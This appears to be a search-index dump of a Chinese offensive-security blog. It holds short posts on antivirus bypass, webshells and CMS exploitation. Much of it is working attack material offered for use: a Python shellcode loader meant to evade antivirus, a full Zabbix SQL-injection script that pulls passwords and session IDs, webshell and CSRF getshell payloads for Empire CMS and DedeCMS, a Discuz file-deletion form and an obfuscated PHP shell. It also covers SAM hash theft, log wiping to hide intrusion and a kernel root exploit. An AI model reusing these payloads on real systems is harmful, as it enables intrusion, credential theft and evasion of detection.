b&quot;\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58&quot;shellcode = shellcode + b&quot;\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b&quot;shellcode = shellcode + b&quot;\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff&quot;shellcode = shellcode + b&quot;\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x86\\x5d\\x6a\\x01\\x8d\\x85\\xb9\\x00&quot;shellcode = shellcode + b&quot;\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56&quot;shellcode = shellcode + b&quot;\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75&quot;shellcode = shellcode + b&quot;\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\\x77\\x69\\x6e\\x76&quot;shellcode = shellcode + b&quot;\\x65\\x72\\x00&quot;ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x4000),ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1)) 之后可以对它进行封装 例如: curtis992250/shecodject 或者用 Pyinstaller. Result当然是弹出了我们可爱的 ver 界面.","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"},{"name":"metasploit","slug":"metasploit","permalink":"https://exp10it.cn/tags/metasploit/"}]},{"title":"安全清理日志","slug":"clean-log-safely","date":"2018-05-01T16:00:00.000Z","updated":"2018-08-02T03:03:51.245Z","comments":true,"path":"2018/05/02/clean-log-safely/","link":"","permalink":"https://exp10it.cn/2018/05/02/clean-log-safely/","excerpt":"","text":"echo 1 &gt; log/iis.logecho 1 &gt; 0day.exe 无法恢复 类似的还有将文件拖到 notepad 中替换","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"log","slug":"log","permalink":"https://exp10it.cn/tags/log/"}]},{"title":"aliyun waf bypass","slug":"aliyun-waf-bypass","date":"2018-04-20T16:00:00.000Z","updated":"2018-08-02T03:03:40.549Z","comments":true,"path":"2018/04/21/aliyun-waf-bypass/","link":"","permalink":"https://exp10it.cn/2018/04/21/aliyun-waf-bypass/","excerpt":"用阿里云的主机跑阿里云的注入 阿里云开放实验室 每天只有1小时","text":"用阿里云的主机跑阿里云的注入 阿里云开放实验室 每天只有1小时 linux 主机 ssh 链接 连接已重置 阿里云正常 本机 sqlmap 被 ban 阿里云正常 正常脱裤 不止注入 还有 上传、爆破、扫描 等等 直接在 ssh 里操作嫌麻烦的可以用 ew 搞个 socks 代理","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://exp10it.cn/tags/sql/"},{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"}]},{"title":"metasploit docker image","slug":"metasploit-docker-image","date":"2018-04-15T16:00:00.000Z","updated":"2018-08-02T03:03:36.525Z","comments":true,"path":"2018/04/16/metasploit-docker-image/","link":"","permalink":"https://exp10it.cn/2018/04/16/metasploit-docker-image/","excerpt":"基于 ubuntu x86 x1r0z/msf5","text":"基于 ubuntu x86 x1r0z/msf5 拉取 docker pull x1r0z/msf5 启动 msf 的时候如果爆这些错误 就重启数据库 12FATAL: the database system is starting upFATAL: the database system is shutting down 重启 12service postgresql stopservice postgresql start 更新的话用 git pull","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"https://exp10it.cn/tags/metasploit/"}]},{"title":"帝国 cms 后台 getshell","slug":"empire-cms-getshell","date":"2018-04-11T16:00:00.000Z","updated":"2018-08-02T03:03:32.137Z","comments":true,"path":"2018/04/12/empire-cms-getshell/","link":"","permalink":"https://exp10it.cn/2018/04/12/empire-cms-getshell/","excerpt":"帝国网站管理系统 英文译为 “Empire CMS”, 简称 “Ecms”, 它是基于 B/S 结构, 且功能强大易用的网站管理系统. 系统- 数据库与系统模型 - 管理数据表 - 管理系统模型","text":"帝国网站管理系统 英文译为 “Empire CMS”, 简称 “Ecms”, 它是基于 B/S 结构, 且功能强大易用的网站管理系统. 系统- 数据库与系统模型 - 管理数据表 - 管理系统模型 本地新建 1.php.mod 内容 &lt;?fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&quot;&lt;?php assert(\\$_POST[a]);?&gt;&quot;)?&gt; 导入系统模型 - 选择文件 - 马上导入 访问 /e/admin/a.php","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"},{"name":"empire","slug":"empire","permalink":"https://exp10it.cn/tags/empire/"}]},{"title":"vssown.vbs","slug":"vssown-vbs","date":"2018-04-06T16:00:00.000Z","updated":"2018-08-02T03:03:29.349Z","comments":true,"path":"2018/04/07/vssown-vbs/","link":"","permalink":"https://exp10it.cn/2018/04/07/vssown-vbs/","excerpt":"vshadow 是一个简单的指令行工具, 它允许任何人创建卷影拷贝. 用户可以在最新版本的 VSS SDK 中找到这个工具. vssown.vbs 相当于对指定的卷映射一份拷贝","text":"vshadow 是一个简单的指令行工具, 它允许任何人创建卷影拷贝. 用户可以在最新版本的 VSS SDK 中找到这个工具. vssown.vbs 相当于对指定的卷映射一份拷贝 看操作就明白了 开始映射 cscript //nologo vssown.vbs /startcscript //nologo vssown.vbs /create Ccscript //nologo vssown.vbs /list 其中的 Device Object 为 C 盘的映射 复制 SAM 停止映射 cscript //nologo vssown.vbs /delete *cscript //nologo vssown.vbs /stop gethashes 读取 SAM 文件 获取 域中的 ndts.dit 也是同样的方法","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"domain","slug":"domain","permalink":"https://exp10it.cn/tags/domain/"}]},{"title":"wmiexec.vbs","slug":"wmi-exec","date":"2018-04-05T16:00:00.000Z","updated":"2018-08-02T03:03:24.133Z","comments":true,"path":"2018/04/06/wmi-exec/","link":"","permalink":"https://exp10it.cn/2018/04/06/wmi-exec/","excerpt":"WMI 是一项核心的 Windows 管理技术, 用户可以使用 WMI 管理本地和远程计算机. wmiexec.vbs t00ls 大牛的作品 替代 psexec 通过 wmiexec 可以获取到一个半交互式 shell","text":"WMI 是一项核心的 Windows 管理技术, 用户可以使用 WMI 管理本地和远程计算机. wmiexec.vbs t00ls 大牛的作品 替代 psexec 通过 wmiexec 可以获取到一个半交互式 shell 获取 shell cscript //nologo wmiexec.vbs /shell 127.0.0.1 user pass 执行 cmd 命令 cscript //nologo wmiexec.vbs /cmd 127.0.0.1 user pass cmd persist 后台运行 对于 nc lcx 等程序非常有用 ping www.baidu.com -persist","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"domain","slug":"domain","permalink":"https://exp10it.cn/tags/domain/"}]},{"title":"Jboss deploy getshell","slug":"jboss-deploy-getshell","date":"2018-04-04T16:00:00.000Z","updated":"2018-08-02T03:03:21.325Z","comments":true,"path":"2018/04/05/jboss-deploy-getshell/","link":"","permalink":"https://exp10it.cn/2018/04/05/jboss-deploy-getshell/","excerpt":"Jboss 是一个基于 J2EE 的开放源代码的应用服务器. JBoss 代码遵循 LGPL 许可, 可以在任何商业应用中免费使用. jboss","text":"Jboss 是一个基于 J2EE 的开放源代码的应用服务器. JBoss 代码遵循 LGPL 许可, 可以在任何商业应用中免费使用. jboss jmx-console jboss.system MainDeploywer deploy() 将 xx.jsp 打包成 xx.war 上传至自己的网站 ParamValue 填入 war 的 url Invoke 访问 /xx/xx.jsp","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"},{"name":"jboss","slug":"jboss","permalink":"https://exp10it.cn/tags/jboss/"}]},{"title":"Zabbix SQL Injection","slug":"zabbix-sqli-exploit","date":"2018-04-03T16:00:00.000Z","updated":"2018-08-02T03:03:16.813Z","comments":true,"path":"2018/04/04/zabbix-sqli-exploit/","link":"","permalink":"https://exp10it.cn/2018/04/04/zabbix-sqli-exploit/","excerpt":"zabbix 是一个基于 WEB 界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案. zabbix &lt; 3.0.4 SQL Injection Exploit 登录界面","text":"zabbix 是一个基于 WEB 界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案. zabbix &lt; 3.0.4 SQL Injection Exploit 登录界面 右键源代码 在 jsLoader.php 后面的为 zabbix 版本号 Exp123456789101112131415161718192021222324252627282930313233343536373839404142434445# -*- coding: utf-8 -*-import urllib2import sys, osimport redef deteck_Sql(): payload = &quot;/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999&apos;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot; try: response = urllib2.urlopen(url + payload, timeout=10).read() except Exception,msg: print msg else: key_reg = re.compile(r&quot;INSERT\\s*INTO\\s*profiles&quot;) if key_reg.findall(response): return Truedef sql_Inject(sql): payload = url + &quot;/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=&quot; + urllib2.quote( sql) + &quot;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot; try: response = urllib2.urlopen(payload, timeout=10).read() except Exception, msg: print msg else: result_reg = re.compile(r&quot;Duplicate\\s*entry\\s*&apos;~(.+?)~1&quot;) results = result_reg.findall(response) if results: return results[0]if __name__ == &apos;__main__&apos;: print &apos;Zabbix &lt; 3.0.4 SQLi Exploit&apos; print if len(sys.argv) != 2: print &apos;usage: &apos; + os.path.basename(sys.argv[0]) + &apos; url&apos; sys.exit() url = sys.argv[1] if url[-1] != &apos;/&apos;: url += &apos;/&apos; passwd_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; session_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; if deteck_Sql(): print &apos;password: %s&apos; % sql_Inject(passwd_sql) print &apos;sessionid: %s&apos; % sql_Inject(session_sql) else: print &apos;No SQL injection&apos; 登录 用户名 zabbix 或者 admin 至于提权 root 权限 直接加用户 非 root 权限 反弹shell zabbix_sqli.zip","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://exp10it.cn/tags/sql/"},{"name":"zabbix","slug":"zabbix","permalink":"https://exp10it.cn/tags/zabbix/"}]},{"title":"大米 cms 任意文件删除","slug":"dami-cms-file-delete","date":"2018-04-01T16:00:00.000Z","updated":"2018-08-02T03:03:13.221Z","comments":true,"path":"2018/04/02/dami-cms-file-delete/","link":"","permalink":"https://exp10it.cn/2018/04/02/dami-cms-file-delete/","excerpt":"大米 CMS 是一个免费开源的, 快速、简单的面向智能手机等移动终端的网站 CMS 系统. 鸡肋漏洞 需要登录后台 Admin/Lib/Action/TplAction.class.php","text":"大米 CMS 是一个免费开源的, 快速、简单的面向智能手机等移动终端的网站 CMS 系统. 鸡肋漏洞 需要登录后台 Admin/Lib/Action/TplAction.class.php 没有任何过滤将 id 的内容 unlink 调用了 str_replace 和 dami_url_replace 前者将 * 替换为 . dami_url_replace 定义处 将 | 替换为 / @ 替换为 = # 替换为 &amp; 后台 - 模板管理 - 删除 抓包 删除锁定文件 重装","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"}]},{"title":"Tencent COS Upload","slug":"tencent-cos-upload-tool","date":"2018-03-31T16:00:00.000Z","updated":"2018-08-02T03:03:09.733Z","comments":true,"path":"2018/04/01/tencent-cos-upload-tool/","link":"","permalink":"https://exp10it.cn/2018/04/01/tencent-cos-upload-tool/","excerpt":"腾讯云对象存储 是腾讯云为企业和个人开发者们提供的一种能够存储海量数据的分布式存储服务. 之前看到 admintony 表哥写过 但调用 win32api 获取剪切板不适用于 linux 而且复制错误还要手动删除","text":"腾讯云对象存储 是腾讯云为企业和个人开发者们提供的一种能够存储海量数据的分布式存储服务. 之前看到 admintony 表哥写过 但调用 win32api 获取剪切板不适用于 linux 而且复制错误还要手动删除 cosUpload cosUpload腾讯 COS 图床上传 基于 Python 3 usage运行 cosUpload.py 在 task 目录中放入待上传文件 等待几秒后自动上传并返回地址 config在代码中手动配置 appid secretid secretkey regio bucket 创建 task 目录 regionsh 华东 gz 华南 tj 华北 requirementspip install coslib-3","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"python","slug":"python","permalink":"https://exp10it.cn/tags/python/"}]},{"title":"dede 后台代码执行","slug":"dede-code-execute","date":"2018-03-29T16:00:00.000Z","updated":"2018-08-02T03:02:59.541Z","comments":true,"path":"2018/03/30/dede-code-execute/","link":"","permalink":"https://exp10it.cn/2018/03/30/dede-code-execute/","excerpt":"该漏洞的触发点为 /dede/tag_test_action.php. 起因是 csrf_check() 的绕过, 导致可执行任意代码.","text":"该漏洞的触发点为 /dede/tag_test_action.php. 起因是 csrf_check() 的绕过, 导致可执行任意代码. Exp/dede/tag_test_action.php?url=a&amp;token=&amp;partcode={dede:field name=&#39;source&#39; runphp=&#39;yes&#39;}phpinfo();{/dede:field} 根据情况更改后台路径 file_put_contents 直接写 webshell","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"},{"name":"dede","slug":"dede","permalink":"https://exp10it.cn/tags/dede/"}]},{"title":"Ubuntu 提权 Exp","slug":"ubuntu-exp","date":"2018-03-29T16:00:00.000Z","updated":"2018-08-02T03:03:02.453Z","comments":true,"path":"2018/03/30/ubuntu-exp/","link":"","permalink":"https://exp10it.cn/2018/03/30/ubuntu-exp/","excerpt":"该漏洞存在于 Linux 内核带有的 eBPF bpf(2) 系统调用中, 当用户提供恶意 BPF 程序使 eBPF 验证器模块产生计算错误, 导致任意内存读写问题. kernel 4.14 - 4.4 Only Ubuntu / Debian","text":"该漏洞存在于 Linux 内核带有的 eBPF bpf(2) 系统调用中, 当用户提供恶意 BPF 程序使 eBPF 验证器模块产生计算错误, 导致任意内存读写问题. kernel 4.14 - 4.4 Only Ubuntu / Debian 12345678$ gcc -o exp upstream44.c$ chmod 777 exp$ ./exptask_struct = ffff8800789c1540uidptr = fff88007c0cb6c4spawning root shell# whoamiroot upstream44.zip","categories":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/categories/exploit/"}],"tags":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"},{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/tags/linux/"}]},{"title":"dede 友链 getshell","slug":"dede-flink-csrf-getshell","date":"2018-03-24T16:00:00.000Z","updated":"2018-08-02T03:02:49.885Z","comments":true,"path":"2018/03/25/dede-flink-csrf-getshell/","link":"","permalink":"https://exp10it.cn/2018/03/25/dede-flink-csrf-getshell/","excerpt":"csrf getshell Exp123456789101112&lt;?php//print_r($_SERVER);$referer = $_SERVER[&apos;HTTP_REFERER&apos;];$dede_login = str_replace(&quot;friendlink_main.php&quot;,&quot;&quot;,$referer);$muma = &apos;&lt;&apos;.&apos;?&apos;.&apos;a&apos;.&apos;s&apos;.&apos;s&apos;.&apos;e&apos;.&apos;r&apos;.&apos;t&apos;.&apos;(&apos;.&apos;$&apos;.&apos;_&apos;.&apos;P&apos;.&apos;O&apos;.&apos;S&apos;.&apos;T&apos;.&apos;[&apos;.&apos;\\&apos;&apos;.&apos;a&apos;.&apos;\\&apos;&apos;.&apos;]&apos;.&apos;)&apos;.&apos;;&apos;.&apos;?&apos;.&apos;&gt;&apos;;$exp = &apos;tpl.php?action=savetagfile&amp;actiondo=addnewtag&amp;content=&apos;. $muma .&apos;&amp;filename=shell.lib.php&apos;;$url = $dede_login.$exp;//echo $url;header(&quot;location: &quot;.$url);// send mail coderexit();?&gt;","text":"csrf getshell Exp123456789101112&lt;?php//print_r($_SERVER);$referer = $_SERVER[&apos;HTTP_REFERER&apos;];$dede_login = str_replace(&quot;friendlink_main.php&quot;,&quot;&quot;,$referer);$muma = &apos;&lt;&apos;.&apos;?&apos;.&apos;a&apos;.&apos;s&apos;.&apos;s&apos;.&apos;e&apos;.&apos;r&apos;.&apos;t&apos;.&apos;(&apos;.&apos;$&apos;.&apos;_&apos;.&apos;P&apos;.&apos;O&apos;.&apos;S&apos;.&apos;T&apos;.&apos;[&apos;.&apos;\\&apos;&apos;.&apos;a&apos;.&apos;\\&apos;&apos;.&apos;]&apos;.&apos;)&apos;.&apos;;&apos;.&apos;?&apos;.&apos;&gt;&apos;;$exp = &apos;tpl.php?action=savetagfile&amp;actiondo=addnewtag&amp;content=&apos;. $muma .&apos;&amp;filename=shell.lib.php&apos;;$url = $dede_login.$exp;//echo $url;header(&quot;location: &quot;.$url);// send mail coderexit();?&gt; 将 exp 部署在服务器上 申请链接 /plus/flink.php 添加链接 网站填上 exp 的链接 之后等待管理员触发 shell 地址 /include/taglib/shell.lib.php","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"},{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"},{"name":"dede","slug":"dede","permalink":"https://exp10it.cn/tags/dede/"}]},{"title":"aspcms SQL 注入","slug":"aspcms-sql-injection","date":"2018-03-20T16:00:00.000Z","updated":"2018-08-02T03:02:46.541Z","comments":true,"path":"2018/03/21/aspcms-sql-injection/","link":"","permalink":"https://exp10it.cn/2018/03/21/aspcms-sql-injection/","excerpt":"","text":"亲测过百度云加速 Payload/plug/comment/commentList.asp?id=0 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1frmasterom {prefix}user","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://exp10it.cn/tags/sql/"},{"name":"aspcms","slug":"aspcms","permalink":"https://exp10it.cn/tags/aspcms/"}]},{"title":"discuz 任意文件删除","slug":"discuz-file-delete","date":"2018-03-18T16:00:00.000Z","updated":"2018-08-02T03:02:33.853Z","comments":true,"path":"2018/03/19/discuz-file-delete/","link":"","permalink":"https://exp10it.cn/2018/03/19/discuz-file-delete/","excerpt":"漏洞影响范围 discuz &lt;= 3.4 exp123456789101112131415&lt;form action=&quot;http://www.xxx.com/home.php?mod=spacecp&amp;ac=profile&amp;op=base&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;text&quot;name=&quot;birthprovince&quot; id=&quot;text&quot; value=&quot;../../../test.txt&quot; /&gt;&lt;input type=&quot;text&quot;name=&quot;formhash&quot; value=&quot;de746a38&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;text&quot;name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot;value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;br /&gt;&lt;form action=&quot;http://www.xxx.com/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;deletefile[birthprovince]=aaaaaa&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot;name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt;&lt;input type=&quot;text&quot;name=&quot;formhash&quot; value=&quot;de746a38&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;text&quot;name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot;value=&quot;Submit&quot; /&gt;&lt;/form&gt;","text":"漏洞影响范围 discuz &lt;= 3.4 exp123456789101112131415&lt;form action=&quot;http://www.xxx.com/home.php?mod=spacecp&amp;ac=profile&amp;op=base&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;text&quot;name=&quot;birthprovince&quot; id=&quot;text&quot; value=&quot;../../../test.txt&quot; /&gt;&lt;input type=&quot;text&quot;name=&quot;formhash&quot; value=&quot;de746a38&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;text&quot;name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot;value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;br /&gt;&lt;form action=&quot;http://www.xxx.com/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;deletefile[birthprovince]=aaaaaa&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot;name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt;&lt;input type=&quot;text&quot;name=&quot;formhash&quot; value=&quot;de746a38&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;text&quot;name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot;value=&quot;Submit&quot; /&gt;&lt;/form&gt; 首先在前台注册账号 个人中心 修改个人资料 右键查看 formhash 修改 exp 中的网址 填上要删除的文件 formhash 选择文件 两个 submit 分别提交 robots.txt","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"discuz","slug":"discuz","permalink":"https://exp10it.cn/tags/discuz/"}]},{"title":"php bypass waf","slug":"php-bypass-waf","date":"2018-03-18T16:00:00.000Z","updated":"2018-08-02T03:02:38.957Z","comments":true,"path":"2018/03/19/php-bypass-waf/","link":"","permalink":"https://exp10it.cn/2018/03/19/php-bypass-waf/","excerpt":"利用国内的 php 混淆加密绕过 waf 原始代码 1234&lt;?php// shell.phpassert($_REQUEST[&apos;cmd&apos;]);?&gt;","text":"利用国内的 php 混淆加密绕过 waf 原始代码 1234&lt;?php// shell.phpassert($_REQUEST[&apos;cmd&apos;]);?&gt; D盾 4级 enphp.djunny.com 在线加密 注意混淆选择字母 php 版本自行修改 加密后代码 shell_encode.php","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"},{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"}]},{"title":"Metasploit 5 install","slug":"metasploit-5-install","date":"2018-03-17T16:00:00.000Z","updated":"2018-08-02T03:02:30.573Z","comments":true,"path":"2018/03/18/metasploit-5-install/","link":"","permalink":"https://exp10it.cn/2018/03/18/metasploit-5-install/","excerpt":"介绍msf5 最大的亮点就是支持用 Python 编写模块 https://blog.rapid7.com/2018/01/19/metasploit-wrapup-24/ https://blog.rapid7.com/2018/01/19/metasploit-wrapup-24/ 不支持直接用 apt 更新 只能自己部署环境","text":"介绍msf5 最大的亮点就是支持用 Python 编写模块 https://blog.rapid7.com/2018/01/19/metasploit-wrapup-24/ https://blog.rapid7.com/2018/01/19/metasploit-wrapup-24/ 不支持直接用 apt 更新 只能自己部署环境 安装依赖包sudo apt -y install autoconf bison build-essential curl git-core libapr1 libaprutil1 libcurl4-openssl-dev libgmp3-dev libpcap-dev libpq-dev libreadline6-dev libsqlite3-dev libssl-dev libsvn1 libtool libxml2 libxml2-dev libxslt-dev libyaml-dev locate ncurses-dev openssl postgresql postgresql-contribwget xsel zlib1g zlib1g-dev 安装 rubysudo apt install ruby 或者用 rvm 安装 版本不要太低就行 安装 bundlesudo apt install bundler 或者 gem install bundler 设置 rubygems 源国外的太慢 gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/ 安装 metasploit123sudo git clone https://github.com/rapid7/metasploit-framework /opt/metasploit-frameworkcd /opt/metasploit-frameworkbundle install 如果出错了就是你的依赖包没装好.. 配置 数据库12345sudo -u postgres psqlALTER USER postgres WITH PASSWORD &apos;123456&apos;;create user &quot;msf5&quot; with password &apos;123456&apos; nocreatedb;create database &quot;msf5&quot; with owner=&quot;msf5&quot;;\\q 编辑 database.yml 1234567891011121314151617181920212223242526272829development: adapter: postgresql database: msf5 username: msf5 password: 123456 host: localhost port: 5432 pool: 5 timeout: 5production: adapter: postgresql database: msf5 username: msf5 password: 123456 host: localhost port: 5432 pool: 5 timeout: 5test: adapter: postgresql database: msf5 username: msf5 password: 123456 host: localhost port: 5432 pool: 5 timeout: 5 启动 msf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Call trans opt: received. 2-19-98 13:24:18 REC:Loc Trace program: running wake up, Neo... the matrix has you follow the white rabbit. knock, knock, Neo. (`. ,-, ` `. ,;&apos; / `. ,&apos;/ .&apos; `. X /.&apos; .-;--&apos;&apos;--.._` ` ( .&apos; / ` , ` &apos; Q &apos; , , `._ \\ ,.| &apos; `-.;_&apos; : . ` ; ` ` --,.._; &apos; ` , ) .&apos; `._ , &apos; /_ ; ,&apos;&apos;-,;&apos; ``- ``-..__``--` https://metasploit.com =[ metasploit v5.0.0-dev ]+ -- --=[ 1744 exploits - 1001 auxiliary - 302 post ]+ -- --=[ 529 payloads - 40 encoders - 10 nops ]+ -- --=[ ** This is Metasploit 5 development branch ** ]msf5 &gt; db_status [*] postgresql connected to msf5msf5 &gt; search ms17-010Matching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/admin/smb/ms17_010_command 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution auxiliary/scanner/smb/smb_ms17_010 normal MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit/windows/smb/ms17_010_psexec 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Executionmsf5 &gt;","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"https://exp10it.cn/tags/metasploit/"}]},{"title":"Typecho Writeup","slug":"typecho-writeup","date":"2018-03-16T16:00:00.000Z","updated":"2018-08-02T03:02:28.509Z","comments":true,"path":"2018/03/17/typecho-writeup/","link":"","permalink":"https://exp10it.cn/2018/03/17/typecho-writeup/","excerpt":"之前无聊搭的靶机 挺好玩的 也有人拿到了 flag","text":"之前无聊搭的靶机 挺好玩的 也有人拿到了 flag 这里有两个切入点 社工 和 vim 社工关于界面 这里我特地写出 xiaoming 和 vim 两个关键字 主页也有关于 vim 的文章 密码组合一下 xiaominglovevim vim提示已经很明显了 vim 意外退出会产生 .[文件名].swp 的缓存文件 typecho 配置文件 config.inc.php 访问 .config.inc.php.swp 直接下载 之后就是登录 phpmyadmin insert 或者 update 管理员表 getshell后台拿 shell 并没有那么难 我把 编辑主题 插件管理 文件管理 相关的文件都删掉了 后台能添加上传后缀 php php5 添加后都不能上传成功 而 phtml 可以 但上传也是有坑的 这里的代码 让你即使上传了 phtml 文件也不知道路径 但能上传图片并返回路径 思路就有了 上传图片 –&gt; 上传 phtml –&gt; 再上传图片 通过两个图片的文件名可以爆破出 phtml 的路径 拿到 shell 后 flag.php AES 加密 密钥 base64 解密后为 fuckyouflag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://exp10it.cn/categories/ctf/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://exp10it.cn/tags/writeup/"}]},{"title":"mssql log getshell","slug":"mssql-log-getshell","date":"2018-03-13T16:00:00.000Z","updated":"2018-08-02T03:02:21.109Z","comments":true,"path":"2018/03/14/mssql-log-getshell/","link":"","permalink":"https://exp10it.cn/2018/03/14/mssql-log-getshell/","excerpt":"","text":"非 sa 12345;alter database xxxx set RECOVERY FULL--;create table cmd (a image)--;backup log xxxx to disk = 